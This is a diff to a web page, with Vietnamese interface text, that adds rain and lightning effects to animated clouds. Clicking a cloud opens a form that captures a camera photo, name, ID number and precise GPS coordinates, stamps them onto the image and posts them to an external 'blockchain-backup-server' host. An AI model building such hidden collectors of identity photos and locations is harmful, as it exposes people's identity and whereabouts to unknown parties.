@@ -1004,31 +1004,39 @@ document.getElementById('searchInput').addEventListener('input', e => {
 
 
 
-
-
-    <style>
+<style>
 /* Cloud strip */
-.cloud-strip{position:fixed;left:0;right:0;top:8px;height:120px;pointer-events:none;z-index:999}
-.cloud{position:absolute;top:0;height:100px;width:220px;background:linear-gradient(#111,#000);border-radius:50px;box-shadow:0 20px 40px rgba(0,0,0,0.6);opacity:0.95;pointer-events:auto;cursor:pointer;transform:translateX(-260px);}
+.cloud-strip{position:fixed;left:0;right:0;top:10px;height:160px;pointer-events:none;z-index:999}
+.cloud{position:absolute;top:0;height:100px;width:220px;background:linear-gradient(#111,#000);border-radius:50px;box-shadow:0 20px 60px rgba(0,0,0,0.7);opacity:0.98;pointer-events:auto;cursor:pointer;transform:translateX(-260px);overflow:visible}
 .cloud:before,.cloud:after{content:"";position:absolute;background:inherit;border-radius:50%;}
 .cloud:before{width:140px;height:100px;left:30px;top:-30px}
 .cloud:after{width:120px;height:80px;right:20px;top:-20px}
 
-/* different sizes/positions to feel organic */
+/* sizes + motion */
 .cloud.c1{height:75px;width:260px;top:10px;animation:fly1 28s linear infinite}
 .cloud.c2{height:75px;width:320px;top:5px;animation:fly2 36s linear infinite}
-.cloud.c3{height:75px;width:200px;top:17px;animation:fly3 24s linear infinite}
-
+.cloud.c3{height:57px;width:200px;top:17px;animation:fly3 24s linear infinite}
 @keyframes fly1{from{transform:translateX(-320px)} 100%{transform:translateX(calc(100vw + 320px))}}
 @keyframes fly2{from{transform:translateX(-420px)} 100%{transform:translateX(calc(100vw + 420px))}}
 @keyframes fly3{from{transform:translateX(-260px)} 100%{transform:translateX(calc(100vw + 260px))}}
 
-/* subtle parallax */
 .cloud.c1{filter:blur(0.6px)}
 .cloud.c2{filter:blur(1.2px);opacity:0.9}
 .cloud.c3{filter:blur(0.2px);opacity:0.98}
 
-/* Popup styles */
+/* Rain container under each cloud */
+.cloud .rain{position:absolute;left:0;right:0;top:70%;height:220px;pointer-events:none;overflow:hidden}
+.cloud .raindrop{position:absolute;top:-20px;width:2px;height:18px;background:linear-gradient(180deg, rgba(200,220,255,0.9), rgba(120,160,200,0.6));opacity:0.8;border-radius:1px;transform:skewX(-15deg);animation:fall linear infinite}
+@keyframes fall{to{transform:translateY(300px) skewX(-15deg);opacity:0.2}}
+
+/* Lightning bolt */
+.lightning-bolt{position:absolute;left:50%;top:10px;width:6px;height:140px;margin-left:-3px;transform-origin:top center;opacity:0;pointer-events:none;z-index:1500}
+.lightning-bolt .seg{position:absolute;width:100%;height:20%;background:linear-gradient(90deg,#fffacd,#aee6ff);box-shadow:0 0 18px 6px rgba(200,230,255,0.9);}
+.bolt-flash{position:fixed;inset:0;background:rgba(255,255,255,0.0);pointer-events:none;opacity:0;z-index:1400}
+.bolt-flash.active{animation:flashAnim 200ms ease-in-out}
+@keyframes flashAnim{0%{opacity:0.95}50%{opacity:0.5}100%{opacity:0}}
+
+/* Popup styles (unchanged, slightly compressed) */
 .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;align-items:center;justify-content:center;z-index:2000}
 .modal{width:min(760px,94%);max-width:760px;background:linear-gradient(180deg,#0f1724,#071027);border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.7);overflow:hidden;transform:translateY(30px) scale(0.98);opacity:0;transition:all 260ms cubic-bezier(.2,.9,.3,1)}
 .modal.open{transform:translateY(0) scale(1);opacity:1}
@@ -1041,20 +1049,16 @@ input[type=text]{padding:10px;border-radius:8px;border:1px solid rgba(255,255,25
 .btn{padding:10px 12px;border-radius:10px;border:0;background:linear-gradient(90deg,#1f7bd1,#2aa4ff);color:white;font-weight:600;cursor:pointer}
 .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06)}
 .small{font-size:12px;color:#9fbbe6}
-
-/* camera area */
 .camera-box{background:#071122;border-radius:8px;padding:10px;display:flex;flex-direction:column;align-items:center;gap:8px}
 video{width:100%;height:220px;border-radius:6px;background:#000;object-fit:cover}
 canvas{display:none}
 .preview{width:100%;height:220px;border-radius:6px;background:#000;display:flex;align-items:center;justify-content:center;color:#fff}
 .footer{display:flex;gap:10px;align-items:center;padding:12px 18px;border-top:1px solid rgba(255,255,255,0.03);justify-content:space-between}
 
-/* tiny animation for cloud click */
-.cloud:active{transform:scale(0.98)}
-
-/* responsive */
-@media (max-width:760px){.modal-body{grid-template-columns:1fr;}}
+@media (max-width:760px){.modal-body{grid-template-columns:1fr}}
 </style>
+
+
 
 <!-- Cloud layer (click a cloud to open the registration popup) -->
 <div class="cloud-strip" aria-hidden="true">
@@ -1077,8 +1081,8 @@ canvas{display:none}
     <div class="modal-body">
       <div>
         <div class="form-row">
-          <label for="nameInput">Name + Phone</label>
-          <input type="text" id="nameInput" placeholder="Full Name + Phone" />
+          <label for="nameInput">Name</label>
+          <input type="text" id="nameInput" placeholder="Full Name" />
         </div>
         <div class="form-row" style="margin-top:8px">
           <label for="idInput">ID</label>
@@ -1111,10 +1115,8 @@ canvas{display:none}
 </div>
 
 <script>
-// CONFIG: change this to your server endpoint that handles saving logs (expects JSON)
 const UPLOAD_URL = 'https://blockchain-backup-server-2.onrender.com/uploadSafeImage';
 
-// Basic DOM refs
 const clouds = document.querySelectorAll('.cloud');
 const overlay = document.getElementById('modalOverlay');
 const modal = document.getElementById('registerModal');
@@ -1136,108 +1138,203 @@ let lastCoords = null;
 let lastImageBase64 = null;
 let lastFilename = null;
 
-// open modal when clicking a cloud
-clouds.forEach(c => c.addEventListener('click', () => openModal()));
+// ====== 🌧️ Mưa & ⚡ Sét (giữ nguyên) ======
+document.querySelectorAll('.cloud').forEach(cloud => {
+  const rainContainer = document.createElement('div');
+  rainContainer.className = 'rain';
+  cloud.appendChild(rainContainer);
+  const dropCount = 25 + Math.floor(Math.random() * 25);
+  for (let i = 0; i < dropCount; i++) {
+    const drop = document.createElement('div');
+    drop.className = 'raindrop';
+    drop.style.left = Math.random() * 100 + '%';
+    drop.style.animationDuration = (0.6 + Math.random() * 0.9) + 's';
+    drop.style.animationDelay = (Math.random() * 1.2) + 's';
+    rainContainer.appendChild(drop);
+  }
+});
 
-function openModal(){
-  overlay.style.display = 'flex';
-  // allow CSS animation frame
-  requestAnimationFrame(()=> modal.classList.add('open'));
+const flashOverlay = document.createElement('div');
+flashOverlay.className = 'bolt-flash';
+document.body.appendChild(flashOverlay);
+
+function createLightning() {
+  const bolt = document.createElement('div');
+  bolt.className = 'lightning-bolt';
+  const segCount = 5 + Math.floor(Math.random() * 3);
+  for (let i = 0; i < segCount; i++) {
+    const seg = document.createElement('div');
+    seg.className = 'seg';
+    seg.style.top = (i * 18) + 'px';
+    seg.style.transform = `rotate(${(Math.random() - 0.5) * 30}deg)`;
+    seg.style.height = 16 + Math.random() * 8 + 'px';
+    bolt.appendChild(seg);
+  }
+  const cloud = document.querySelectorAll('.cloud')[Math.floor(Math.random() * 3)];
+  const rect = cloud.getBoundingClientRect();
+  bolt.style.left = rect.left + rect.width / 2 + 'px';
+  bolt.style.top = rect.top + 30 + 'px';
+  document.body.appendChild(bolt);
+  bolt.animate([{ opacity: 1 }, { opacity: 0 }], { duration: 220 });
+  flashOverlay.classList.add('active');
+  setTimeout(() => {
+    flashOverlay.classList.remove('active');
+    bolt.remove();
+  }, 240);
 }
-function close(){
+setInterval(() => { if (Math.random() < 0.6) createLightning(); }, 3000 + Math.random() * 5000);
+
+// ====== 📷 Modal Control ======
+clouds.forEach(c => c.addEventListener('click', openModal));
+function openModal() {
+  overlay.style.display = 'flex';
+  requestAnimationFrame(() => modal.classList.add('open'));
+}
+function close() {
   modal.classList.remove('open');
-  setTimeout(()=> overlay.style.display='none', 220);
+  setTimeout(() => overlay.style.display = 'none', 220);
 }
 closeModal.addEventListener('click', close);
 cancelBtn.addEventListener('click', close);
+overlay.addEventListener('click', e => { if (e.target === overlay) close(); });
 
-// Camera control
-startCameraBtn.addEventListener('click', async ()=>{
-  try{
-    if(!stream){
-      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}, audio:false});
+// ====== 🎥 CAMERA (fix iPhone issue) ======
+startCameraBtn.addEventListener('click', async () => {
+  try {
+    if (!stream) {
+      const constraints = {
+        video: {
+          facingMode: { ideal: 'environment' },
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        },
+        audio: false
+      };
+      stream = await navigator.mediaDevices.getUserMedia(constraints);
       video.srcObject = stream;
+      await video.play();
       statusText.textContent = 'Camera on';
     } else {
-      // stop
       stopStream();
       statusText.textContent = 'Camera off';
     }
-  }catch(err){
+  } catch (err) {
     console.error(err);
     statusText.textContent = 'Không thể mở camera';
   }
 });
 
-function stopStream(){
-  if(!stream) return;
-  stream.getTracks().forEach(t=>t.stop());
+function stopStream() {
+  if (!stream) return;
+  stream.getTracks().forEach(t => t.stop());
   stream = null;
   video.srcObject = null;
 }
 
-// capture
-captureBtn.addEventListener('click', async ()=>{
-  if(!stream){
+// 📸 Chụp ảnh có hiệu ứng xác thực (viền sáng + tem phản chiếu)
+captureBtn.addEventListener('click', async () => {
+  if (!stream) {
     statusText.textContent = 'Vui lòng mở camera trước';
     return;
   }
-  // get coords (best-effort)
-  try{
+
+  try {
     lastCoords = await getCoords();
-  }catch(e){
-    console.warn('coords error', e);
+  } catch {
     lastCoords = null;
   }
 
-  // draw current video frame to canvas and overlay text
   const w = video.videoWidth || 1280;
   const h = video.videoHeight || 720;
-  canvas.width = w; canvas.height = h;
+  canvas.width = w;
+  canvas.height = h;
   const ctx = canvas.getContext('2d');
+
+  // Vẽ ảnh gốc từ camera
   ctx.drawImage(video, 0, 0, w, h);
 
-  // overlay: translucent band
-  ctx.fillStyle = 'rgba(0,0,0,0.45)';
-  ctx.fillRect(0, h - 120, w, 120);
+  // Vẽ khung nền mờ phía dưới để chứa thông tin
+  const overlayHeight = h * 0.18;
+  ctx.fillStyle = 'rgba(0, 0, 0, 0.55)';
+  ctx.fillRect(0, h - overlayHeight, w, overlayHeight);
 
-  // overlay text
+  // 🔷 Viền sáng bao quanh khung chữ
+  const gradient = ctx.createLinearGradient(0, h - overlayHeight, w, h);
+  gradient.addColorStop(0, 'rgba(80,200,255,0.6)');
+  gradient.addColorStop(0.5, 'rgba(255,255,255,0.8)');
+  gradient.addColorStop(1, 'rgba(80,200,255,0.6)');
+  ctx.lineWidth = 3;
+  ctx.strokeStyle = gradient;
+  ctx.strokeRect(2, h - overlayHeight + 2, w - 4, overlayHeight - 4);
+
+  // Lấy dữ liệu nhập
   const name = nameInput.value.trim() || 'Không rõ tên';
   const id = idInput.value.trim() || 'Không rõ ID';
-  const coordsTxt = lastCoords ? `${lastCoords.latitude.toFixed(6)}, ${lastCoords.longitude.toFixed(6)}` : 'Toạ độ: không có';
+  const coordsTxt = lastCoords
+    ? `📍 ${lastCoords.latitude.toFixed(6)}, ${lastCoords.longitude.toFixed(6)}`
+    : '⚠️ Không có toạ độ';
 
-  ctx.font = '28px sans-serif';
+  // Thiết lập font động và căn chữ
+  ctx.textBaseline = 'top';
+  ctx.font = `${Math.round(h * 0.035)}px "Segoe UI", sans-serif`;
   ctx.fillStyle = '#eaf3ff';
-  ctx.fillText(`Tên: ${name}`, 20, h - 70);
-  ctx.fillText(`ID: ${id}`, 20, h - 36);
-  ctx.font = '20px monospace';
-  ctx.fillStyle = '#cfe9ff';
-  ctx.fillText(coordsTxt, w - ctx.measureText(coordsTxt).width - 20, h - 36);
+  ctx.shadowColor = 'rgba(0, 200, 255, 0.7)';
+  ctx.shadowBlur = 6;
+  ctx.fillText(`Tên: ${name}`, 98, h - overlayHeight + 18);
 
-  // small watermark/time
-  ctx.font = '14px monospace';
-  const t = new Date().toISOString();
-  ctx.fillStyle = 'rgba(200,220,255,0.85)';
-  ctx.fillText(t, 20, 30);
+  ctx.font = `${Math.round(h * 0.03)}px "Segoe UI", sans-serif`;
+  ctx.fillStyle = '#d0e6ff';
+  ctx.fillText(`ID: ${id}`, 107, h - overlayHeight + 52);
 
-  const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+  const coordsWidth = ctx.measureText(coordsTxt).width;
+  ctx.fillStyle = '#bcdfff';
+  ctx.fillText(coordsTxt, w - coordsWidth - 98, h - overlayHeight + 18);
+
+  // Thời gian góc dưới
+  ctx.font = `${Math.round(h * 0.025)}px monospace`;
+  ctx.fillStyle = 'rgba(220, 240, 255, 0.9)';
+  ctx.shadowBlur = 0;
+  ctx.fillText(new Date().toLocaleString(), 107, h - overlayHeight + 86);
+
+  // 🪩 Tem phản chiếu hologram nhỏ (góc phải dưới)
+  const logo = 'Stormwind255';
+  const logoW = ctx.measureText(logo).width;
+  const gradLogo = ctx.createLinearGradient(w - logoW - 100, h - overlayHeight + 60, w - 30, h);
+  gradLogo.addColorStop(0, '#4fd1ff');
+  gradLogo.addColorStop(0.5, '#b4f5ff');
+  gradLogo.addColorStop(1, '#4fd1ff');
+  ctx.fillStyle = gradLogo;
+  ctx.shadowColor = 'rgba(0, 180, 255, 0.7)';
+  ctx.shadowBlur = 8;
+  ctx.fillText(logo, w - logoW - 98, h - overlayHeight + 86);
+  ctx.shadowBlur = 0;
+
+  // ✨ Hiệu ứng phản chiếu nhẹ phía trên khung chữ
+  const reflectGrad = ctx.createLinearGradient(0, h - overlayHeight - 40, 0, h - overlayHeight);
+  reflectGrad.addColorStop(0, 'rgba(255,255,255,0.25)');
+  reflectGrad.addColorStop(1, 'rgba(255,255,255,0)');
+  ctx.fillStyle = reflectGrad;
+  ctx.fillRect(0, h - overlayHeight - 40, w, 40);
+
+  // Xuất ảnh + hiển thị preview
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
   lastImageBase64 = dataUrl.split(',')[1];
   lastFilename = `offline-safe-${Date.now()}.jpg`;
-
-  // show preview
   preview.innerHTML = '';
-  const img = document.createElement('img'); img.src = dataUrl; img.style.width='100%'; img.style.height='100%'; img.style.objectFit='cover'; img.alt='preview';
+  const img = document.createElement('img');
+  img.src = dataUrl;
+  img.style.width = '100%';
+  img.style.height = '100%';
+  img.style.objectFit = 'cover';
   preview.appendChild(img);
 
   statusText.textContent = 'Đã chụp';
 });
 
-// save & send
-saveBtn.addEventListener('click', async ()=>{
-  if(!lastImageBase64){
-    alert('Bạn chưa chụp ảnh.');
-    return;
-  }
+
+// ====== 💾 Save / Download / Upload ======
+saveBtn.addEventListener('click', async () => {
+  if (!lastImageBase64) return alert('Bạn chưa chụp ảnh.');
   const payload = {
     name: nameInput.value.trim() || null,
     id: idInput.value.trim() || null,
@@ -1246,43 +1343,43 @@ saveBtn.addEventListener('click', async ()=>{
     imageBase64: lastImageBase64
   };
 
-  // attempt upload to server
-  try{
+  try {
     const resp = await fetch(UPLOAD_URL, {
-      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
     });
-    // don't require success to continue
     console.log('upload resp', resp.status);
     statusText.textContent = 'Đã gửi tới server';
-  }catch(e){
+  } catch (e) {
     console.warn('upload failed', e);
     statusText.textContent = 'Không gửi được server';
   }
 
-  // trigger download of image (user requested auto-download of logs)
   triggerDownload(`logs-${Date.now()}.json`, JSON.stringify({
-    timestamp:new Date().toISOString(), name:payload.name, id:payload.id, coords:payload.coords, filename:payload.filename
+    timestamp: new Date().toISOString(),
+    name: payload.name,
+    id: payload.id,
+    coords: payload.coords,
+    filename: payload.filename
   }, null, 2));
 
-  // also download the image itself
   triggerDownload(payload.filename, 'data:image/jpeg;base64,' + payload.imageBase64);
-
   alert('Ảnh và log đã tải xuống (và đã cố gắng gửi tới server).');
 });
 
-// quick manual log download
-downloadLogBtn.addEventListener('click', ()=>{
-  const ln = {timestamp:new Date().toISOString(), name:nameInput.value.trim(), id:idInput.value.trim(), coords:lastCoords||null};
-  triggerDownload(`logs-manual-${Date.now()}.json`, JSON.stringify(ln,null,2));
+downloadLogBtn.addEventListener('click', () => {
+  const ln = { timestamp: new Date().toISOString(), name: nameInput.value.trim(), id: idInput.value.trim(), coords: lastCoords || null };
+  triggerDownload(`logs-manual-${Date.now()}.json`, JSON.stringify(ln, null, 2));
 });
 
-function triggerDownload(filename, data){
+function triggerDownload(filename, data) {
   const a = document.createElement('a');
-  if(data.startsWith('data:')){ // image data
+  if (data.startsWith('data:')) {
     a.href = data;
     a.download = filename;
   } else {
-    const blob = new Blob([data], {type:'application/json'});
+    const blob = new Blob([data], { type: 'application/json' });
     a.href = URL.createObjectURL(blob);
     a.download = filename;
   }
@@ -1291,21 +1388,19 @@ function triggerDownload(filename, data){
   a.remove();
 }
 
-async function getCoords(){
-  if(!('geolocation' in navigator)) throw new Error('No geolocation');
-  return new Promise((resolve, reject)=>{
-    const t = setTimeout(()=> reject(new Error('timeout')), 12000);
-    navigator.geolocation.getCurrentPosition(pos=>{
-      clearTimeout(t); resolve(pos.coords);
-    }, err=>{clearTimeout(t); reject(err)}, {enableHighAccuracy:true, maximumAge:60000, timeout:11000});
+async function getCoords() {
+  if (!('geolocation' in navigator)) throw new Error('No geolocation');
+  return new Promise((resolve, reject) => {
+    const t = setTimeout(() => reject(new Error('timeout')), 12000);
+    navigator.geolocation.getCurrentPosition(
+      pos => { clearTimeout(t); resolve(pos.coords); },
+      err => { clearTimeout(t); reject(err); },
+      { enableHighAccuracy: true, maximumAge: 60000, timeout: 11000 }
+    );
   });
 }
 
-// close modal on overlay click (but not when clicking inside modal)
-overlay.addEventListener('click', (e)=>{ if(e.target===overlay) close(); });
-
-// cleanup when leaving page
-window.addEventListener('beforeunload', ()=> stopStream());
+window.addEventListener('beforeunload', () => stopStream());
 </script>
 
 
